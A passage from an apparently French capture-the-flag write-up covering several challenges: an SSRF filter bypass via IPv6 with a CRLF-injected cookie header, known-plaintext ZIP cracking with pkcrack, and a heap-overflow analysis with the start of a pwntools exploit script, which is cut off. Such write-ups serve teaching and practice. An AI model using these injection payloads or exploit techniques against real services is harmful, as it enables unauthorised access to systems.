&ldquo;var&rdquo;.</li></ul><p>Il suffit de passer aux &ldquo;instructions&rdquo; suivantes jusqu&rsquo;à attérir dans la fonction &ldquo;main()&rdquo; et afficher le contenu de la variable &ldquo;flag&rdquo;.</p><h3 id=v5-flag>V.5. Flag</h3><blockquote><p><a href=http://c4ffddcc437c5df3e6d681e7cafab510.hexpresso.fr target=_blank rel="noopener noreffer">http://c4ffddcc437c5df3e6d681e7cafab510.hexpresso.fr</a></p></blockquote><h3 id=v6-bonus>V.6. Bonus</h3><p>En bonus, il est possible de récupérer le flag plus facilement:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_62f8a4e215f7fce0971f998ba55fe7e1.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_62f8a4e215f7fce0971f998ba55fe7e1.png, /lib/images/writeups/2020_hexpresso_fic/upload_62f8a4e215f7fce0971f998ba55fe7e1.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_62f8a4e215f7fce0971f998ba55fe7e1.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_62f8a4e215f7fce0971f998ba55fe7e1.png title=/lib/images/writeups/2020_hexpresso_fic/upload_62f8a4e215f7fce0971f998ba55fe7e1.png></p><p>En effet, comme le programme va chercher son flag dans une variable d&rsquo;environnement, un des process doit l&rsquo;avoir encore en mémoire.</p><h2 id=vi-step-6---the-host-fetcher>VI. Step 6 - The Host fetcher</h2><table><thead><tr><th>Event</th><th>Challenge</th><th>Category</th><th>Solves</th></tr></thead><tbody><tr><td>CaptureTheFic</td><td>Step 6</td><td>Web</td><td>184</td></tr></tbody></table><h3 id=vi1-etat-des-lieux>VI.1. Etat des lieux</h3><p>On commence ce challenge avec un site web. Visiblement il attend une URL en entrée et affiche le retour dans l&rsquo;Iframe situé sous le bouton &ldquo;submit&rdquo;.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_115f211507ce560cbaad7bd9a400abd4.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_115f211507ce560cbaad7bd9a400abd4.png, /lib/images/writeups/2020_hexpresso_fic/upload_115f211507ce560cbaad7bd9a400abd4.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_115f211507ce560cbaad7bd9a400abd4.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_115f211507ce560cbaad7bd9a400abd4.png title=/lib/images/writeups/2020_hexpresso_fic/upload_115f211507ce560cbaad7bd9a400abd4.png></p><p>Ce challenge ressemble beaucoup à une SSRF. Le but va être de voir s&rsquo;il est possible de taper sur le localhost:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_8814b40771f26479c0e26bcdbdc79d7a.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_8814b40771f26479c0e26bcdbdc79d7a.png, /lib/images/writeups/2020_hexpresso_fic/upload_8814b40771f26479c0e26bcdbdc79d7a.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_8814b40771f26479c0e26bcdbdc79d7a.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_8814b40771f26479c0e26bcdbdc79d7a.png title=/lib/images/writeups/2020_hexpresso_fic/upload_8814b40771f26479c0e26bcdbdc79d7a.png></p><p>En l&rsquo;occurence, <code>127.0.0.1</code> est blacklisté. Une technique courante est de passer par l&rsquo;ipv6, <code>[::]</code>.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_671488712dff4e0d090827fe3dcf089e.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_671488712dff4e0d090827fe3dcf089e.png, /lib/images/writeups/2020_hexpresso_fic/upload_671488712dff4e0d090827fe3dcf089e.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_671488712dff4e0d090827fe3dcf089e.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_671488712dff4e0d090827fe3dcf089e.png title=/lib/images/writeups/2020_hexpresso_fic/upload_671488712dff4e0d090827fe3dcf089e.png></p><p>L&rsquo;iframe renvoit le contenu du port 80, c&rsquo;est une excellente nouvelle. De plus, les sources de la page nous apprend l&rsquo;existence d&rsquo;un endpoint <code>secret</code>:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_20a1cc1e7a7468f53cf364176552bd10.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_20a1cc1e7a7468f53cf364176552bd10.png, /lib/images/writeups/2020_hexpresso_fic/upload_20a1cc1e7a7468f53cf364176552bd10.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_20a1cc1e7a7468f53cf364176552bd10.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_20a1cc1e7a7468f53cf364176552bd10.png title=/lib/images/writeups/2020_hexpresso_fic/upload_20a1cc1e7a7468f53cf364176552bd10.png></p><blockquote><p><code>[::]/secret</code></p></blockquote><p>On sait donc sur quoi taper pour avoir le flag.</p><h3 id=vi2-request-ception>VI.2. Request-ception</h3><p>En essayant de taper directement sur le endpoint <code>secret</code>, ce dernier renvoie une 404. Cependant, si on y passe un paramètre aléatoire, alors un message plus verbeux apparait.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_6ebe23ba5e2d10cceae3314b9a0d2e1f.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_6ebe23ba5e2d10cceae3314b9a0d2e1f.png, /lib/images/writeups/2020_hexpresso_fic/upload_6ebe23ba5e2d10cceae3314b9a0d2e1f.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_6ebe23ba5e2d10cceae3314b9a0d2e1f.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_6ebe23ba5e2d10cceae3314b9a0d2e1f.png title=/lib/images/writeups/2020_hexpresso_fic/upload_6ebe23ba5e2d10cceae3314b9a0d2e1f.png></p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_41efecbf10029577622676492f868c8b.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_41efecbf10029577622676492f868c8b.png, /lib/images/writeups/2020_hexpresso_fic/upload_41efecbf10029577622676492f868c8b.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_41efecbf10029577622676492f868c8b.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_41efecbf10029577622676492f868c8b.png title=/lib/images/writeups/2020_hexpresso_fic/upload_41efecbf10029577622676492f868c8b.png></p><p>Il faut donc trouver un moyen de set le cookie &ldquo;GOSESSION&rdquo; dans la SSRF. Pour celà, il est possible d&rsquo;injecter des CRLF et construire une requête HTTP:</p><blockquote><p><code>[::]/secret?a=1 HTTP/1.1\r\nCookie: GOSESSION=test</code></p></blockquote><p>En principe, la requête utilisée pour la SSRF sera passée avec cette en-tête:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_1e66389b6fa8ff8be01033a3b3d3f77b.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_1e66389b6fa8ff8be01033a3b3d3f77b.png, /lib/images/writeups/2020_hexpresso_fic/upload_1e66389b6fa8ff8be01033a3b3d3f77b.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_1e66389b6fa8ff8be01033a3b3d3f77b.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_1e66389b6fa8ff8be01033a3b3d3f77b.png title=/lib/images/writeups/2020_hexpresso_fic/upload_1e66389b6fa8ff8be01033a3b3d3f77b.png></p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_50ce869d747c79769bdb3713f7e91c46.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_50ce869d747c79769bdb3713f7e91c46.png, /lib/images/writeups/2020_hexpresso_fic/upload_50ce869d747c79769bdb3713f7e91c46.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_50ce869d747c79769bdb3713f7e91c46.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_50ce869d747c79769bdb3713f7e91c46.png title=/lib/images/writeups/2020_hexpresso_fic/upload_50ce869d747c79769bdb3713f7e91c46.png></p><p>Finalement, avec l&rsquo;injection CRLF dans le payload de la SSRF il est possible de modifier les en-tete et ainsi obtenir le flag.</p><h3 id=vi3-flag>VI.3. Flag</h3><blockquote><p><a href=https://ctf.hexpresso.fr/219058289d8699adc0b119374c2fc5bc target=_blank rel="noopener noreffer">https://ctf.hexpresso.fr/219058289d8699adc0b119374c2fc5bc</a></p></blockquote><h2 id=vii-step-7---pwn-me-im-famous>VII. Step 7 - PWN me I&rsquo;m famous</h2><table><thead><tr><th>Event</th><th>Challenge</th><th>Category</th><th>Solves</th></tr></thead><tbody><tr><td>CatureTheFic</td><td>Step 7</td><td>Pwn</td><td>12</td></tr></tbody></table><h3 id=vii1-etat-des-lieux>VII.1. Etat des lieux</h3><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_5f1d11dfd539d74dcbac4c405e2e1bcb.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_5f1d11dfd539d74dcbac4c405e2e1bcb.png, /lib/images/writeups/2020_hexpresso_fic/upload_5f1d11dfd539d74dcbac4c405e2e1bcb.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_5f1d11dfd539d74dcbac4c405e2e1bcb.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_5f1d11dfd539d74dcbac4c405e2e1bcb.png title=/lib/images/writeups/2020_hexpresso_fic/upload_5f1d11dfd539d74dcbac4c405e2e1bcb.png></p><p>On commence donc cette dernière épreuve par un zip chiffré:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_0c10df27deb5496a74511ed017f24c1e.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_0c10df27deb5496a74511ed017f24c1e.png, /lib/images/writeups/2020_hexpresso_fic/upload_0c10df27deb5496a74511ed017f24c1e.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_0c10df27deb5496a74511ed017f24c1e.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_0c10df27deb5496a74511ed017f24c1e.png title=/lib/images/writeups/2020_hexpresso_fic/upload_0c10df27deb5496a74511ed017f24c1e.png></p><p>Comme tout CTFer qui se respect, toujours faire un peu d&rsquo;OSINT sur l&rsquo;équipe orga. Et ça a payé!
+En effet, sur le gist de <code>chaign_c</code>, il y a un dockerfile:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-dockerfile data-lang=dockerfile><span class=line><span class=cl><span class=k>FROM</span><span class=s> ubuntu:xenial</span><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err></span><span class=c># http://phusion.github.io/baseimage-docker/</span><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> apt update <span class=o>&amp;&amp;</span> apt install -y socat<span class=err>
+</span></span></span><span class=line><span class=cl><span class=err></span><span class=c># This ubuntu is required because we need a very specific version of glibc2.23</span><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err></span><span class=c># FROM phusion/baseimage:0.11</span><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> useradd -ms /bin/bash  ctf<span class=err>
+</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>USER</span><span class=s> ctf</span><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> ./chall /chall<span class=err>
+</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> ./flag.txt /<span class=err>
+</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>EXPOSE</span><span class=s> 80/tcp</span><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err>
+</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>CMD</span> socat -d -d TCP-LISTEN:4242,reuseaddr,fork EXEC:/chall/heapme<span class=err>
+</span></span></span></code></pre></td></tr></table></div></div><blockquote><p><a href=https://gist.github.com/nongiach/257e5103ef21235d56926bc053af38dc target=_blank rel="noopener noreffer">https://gist.github.com/nongiach/257e5103ef21235d56926bc053af38dc</a></p></blockquote><p>Il est vrai que ça ressemble beaucoup au challenge actuel. Ce Dockerfile ne nous apprend pas grand chose, sauf qu&rsquo;il tourne avec une image <code>ubuntu:xenial</code>.</p><h3 id=vii2-cassage-du-zip>VII.2. Cassage du zip</h3><p>Lors du listing des fichiers dans l&rsquo;archive, on a pu voir la <code>libc-2.23.so</code>. Selon l&rsquo;algo de ZIP, il est possible de faire du clair connu avec <code>pkcrack</code>.</p><p>Pour extraire la libc du docker, il suffit de faire un volume partagé entre l&rsquo;hote et le container:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_9fd6e86525ba0be31a3a7c20ac71320e.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_9fd6e86525ba0be31a3a7c20ac71320e.png, /lib/images/writeups/2020_hexpresso_fic/upload_9fd6e86525ba0be31a3a7c20ac71320e.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_9fd6e86525ba0be31a3a7c20ac71320e.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_9fd6e86525ba0be31a3a7c20ac71320e.png title=/lib/images/writeups/2020_hexpresso_fic/upload_9fd6e86525ba0be31a3a7c20ac71320e.png></p><p>Le tool <code>pkcrack</code> a besoin d&rsquo;un élément dans le zip, du zip en clair de cet élément et finalement déchiffrer le reste du zip.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_68477772ee42b7aae93107d937c8fcb8.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_68477772ee42b7aae93107d937c8fcb8.png, /lib/images/writeups/2020_hexpresso_fic/upload_68477772ee42b7aae93107d937c8fcb8.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_68477772ee42b7aae93107d937c8fcb8.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_68477772ee42b7aae93107d937c8fcb8.png title=/lib/images/writeups/2020_hexpresso_fic/upload_68477772ee42b7aae93107d937c8fcb8.png></p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_e2f6445498b9fefedb3aab202889fad0.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_e2f6445498b9fefedb3aab202889fad0.png, /lib/images/writeups/2020_hexpresso_fic/upload_e2f6445498b9fefedb3aab202889fad0.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_e2f6445498b9fefedb3aab202889fad0.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_e2f6445498b9fefedb3aab202889fad0.png title=/lib/images/writeups/2020_hexpresso_fic/upload_e2f6445498b9fefedb3aab202889fad0.png></p><p>Maintenant que le zip est déchiffré, il faut réussir le &ldquo;heapme&rdquo;</p><h3 id=vii-pwn-time-enfin-presque>VII. Pwn time (enfin presque)</h3><p>Lors de l&rsquo;execution du binaire on remarque que la fonction alarm est appelé ce qui est plutot embetant quand on essaie d&rsquo;analyser le comportement d&rsquo;un binaire.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_84e65d8f10a8afbe1ee6df1d8d84b14d.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_84e65d8f10a8afbe1ee6df1d8d84b14d.png, /lib/images/writeups/2020_hexpresso_fic/upload_84e65d8f10a8afbe1ee6df1d8d84b14d.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_84e65d8f10a8afbe1ee6df1d8d84b14d.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_84e65d8f10a8afbe1ee6df1d8d84b14d.png title=/lib/images/writeups/2020_hexpresso_fic/upload_84e65d8f10a8afbe1ee6df1d8d84b14d.png></p><p>Pour contourner ce problème on modifie juste l&rsquo;appel de cette fonction par une série de <code>nop</code></p><blockquote><p>Le binaire patché: <a href=http://cloud.id-iot.team/s/42r2nxx7N54PBp8 target=_blank rel="noopener noreffer">http://cloud.id-iot.team/s/42r2nxx7N54PBp8</a></p></blockquote><p>En analysant le code on remarque que le programme permet de créer un disk de taille donnée par l&rsquo;utilisateur:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_c45be89bdf91ea44ae7596cfdcc1b643.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_c45be89bdf91ea44ae7596cfdcc1b643.png, /lib/images/writeups/2020_hexpresso_fic/upload_c45be89bdf91ea44ae7596cfdcc1b643.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_c45be89bdf91ea44ae7596cfdcc1b643.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_c45be89bdf91ea44ae7596cfdcc1b643.png title=/lib/images/writeups/2020_hexpresso_fic/upload_c45be89bdf91ea44ae7596cfdcc1b643.png></p><p>Le programme alloue la taille donnée:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_28a3613f36f6f1bc09e1ed72da60fa50.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_28a3613f36f6f1bc09e1ed72da60fa50.png, /lib/images/writeups/2020_hexpresso_fic/upload_28a3613f36f6f1bc09e1ed72da60fa50.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_28a3613f36f6f1bc09e1ed72da60fa50.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_28a3613f36f6f1bc09e1ed72da60fa50.png title=/lib/images/writeups/2020_hexpresso_fic/upload_28a3613f36f6f1bc09e1ed72da60fa50.png></p><p>Cependant lorsque le programme permet d&rsquo;écrire dedans il oublie de checker la taille ce qui permet à l&rsquo;utilisateur d&rsquo;écraser les données suivantes de la heap:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_af3f77341f4994ce9402d83a7355f0dd.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_af3f77341f4994ce9402d83a7355f0dd.png, /lib/images/writeups/2020_hexpresso_fic/upload_af3f77341f4994ce9402d83a7355f0dd.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_af3f77341f4994ce9402d83a7355f0dd.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_af3f77341f4994ce9402d83a7355f0dd.png title=/lib/images/writeups/2020_hexpresso_fic/upload_af3f77341f4994ce9402d83a7355f0dd.png></p><p>Pour rappel lorsque l&rsquo;on alloue de la mémoire dans la heap la structure de données est la suivante:</p><blockquote><p><code>|size|data|size|data...</code></p></blockquote><p>Lorsqu&rsquo;un chunk est libréré par free il insère le pointeur du bloc précédent.</p><blockquote><p><code>|size|pointeur|data_restante|size...</code></p></blockquote><p>Tout ceci s&rsquo;applique seulement sur des allocations de petites tailles (fastbin).</p><p>Maintenant si on s&rsquo;interesse à ce qui est alloué dans ces chunks, on remarque que c&rsquo;est la classe <code>Disk</code>. Les 16 premiers bytes contiennent les adresses des fonctions de la classe. Autrement dit, read et write.</p><p>Connaisant la taille allouée lors de la création d&rsquo;un disque on peut réécrire la taille du prochain bloc de la heap. Ensuite, il est possible d&rsquo;écrire une nouvelle adresse pour la fonction read permettant de sauter à l&rsquo;adresse écrite lors de l&rsquo;overflow:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_b78b93d6a8b704bda3ee16a8b9f14708.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_b78b93d6a8b704bda3ee16a8b9f14708.png, /lib/images/writeups/2020_hexpresso_fic/upload_b78b93d6a8b704bda3ee16a8b9f14708.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_b78b93d6a8b704bda3ee16a8b9f14708.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_b78b93d6a8b704bda3ee16a8b9f14708.png title=/lib/images/writeups/2020_hexpresso_fic/upload_b78b93d6a8b704bda3ee16a8b9f14708.png></p><p>Maintenant, il est nécessaire de leak la <code>PIE</code> pour s&rsquo;avoir où sauter.</p><blockquote><p>taille de 1 pour disque = 24 bytes de données
+33ème byte adresse du prochain disk
+8 premier bytes de cette meme adresse contient l&rsquo;adresse de read
+8 prochain write
+//33ème byte fonction read
+//41ème byte fonction write</p></blockquote><p>cf photo
+pour un peu plus de précision:</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2020_hexpresso_fic/upload_becc3a7bf68a375d7ab6de210088c36a.png data-srcset="/lib/images/writeups/2020_hexpresso_fic/upload_becc3a7bf68a375d7ab6de210088c36a.png, /lib/images/writeups/2020_hexpresso_fic/upload_becc3a7bf68a375d7ab6de210088c36a.png 1.5x, /lib/images/writeups/2020_hexpresso_fic/upload_becc3a7bf68a375d7ab6de210088c36a.png 2x" data-sizes=auto alt=/lib/images/writeups/2020_hexpresso_fic/upload_becc3a7bf68a375d7ab6de210088c36a.png title=/lib/images/writeups/2020_hexpresso_fic/upload_becc3a7bf68a375d7ab6de210088c36a.png></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span><span class=lnt>45
+</span><span class=lnt>46
+</span><span class=lnt>47
+</span><span class=lnt>48
+</span><span class=lnt>49
+</span><span class=lnt>50
+</span><span class=lnt>51
+</span><span class=lnt>52
+</span><span class=lnt>53
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>createdisk</span><span class=p>(</span><span class=n>index</span><span class=p>,</span> <span class=n>size</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>()),</span>
+</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;0&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>()),</span>
+</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%d</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>size</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>size</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>()),</span>
+</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%d</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>index</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recvline</span><span class=p>()),</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>writedisk</span><span class=p>(</span><span class=n>index</span><span class=p>,</span> <span class=n>data</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>()),</span>
+</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>()),</span>
+</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%d</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>index</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>()),</span>
+</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%s</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>data</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>readdisk</span><span class=p>(</span><span class=n>index</span><span class=p>):</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>()),</span>
+</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>sh</span><span class=o>.</span><span class=n>recv</span><span class=p>()),</span>
+</span></span><span class=line><span class=cl>    <span class=n>sh</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=s2>&#34;</span><span class=si>%d</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>index</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>index</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>    <span class=n>a</span><span class=o>=</span><span class=n>sh</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=n>a</span><span class=o>=</span><span class=n>sh</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>a</span><span class=p>)</span> <span class=o>-</span> <span class=nb>len</span><span class=p>(</span><span class=s2>&#34;Data: &#34;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=n>a</span><span class=o>.</span><span class=n>decode</span><span class=p>(</span><span class=s1>&#39;utf-8&#39;</span><span class=p>))</span>
+</span></span><span class=line><span class=cl>    <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>a</span><span class=p>:</span>
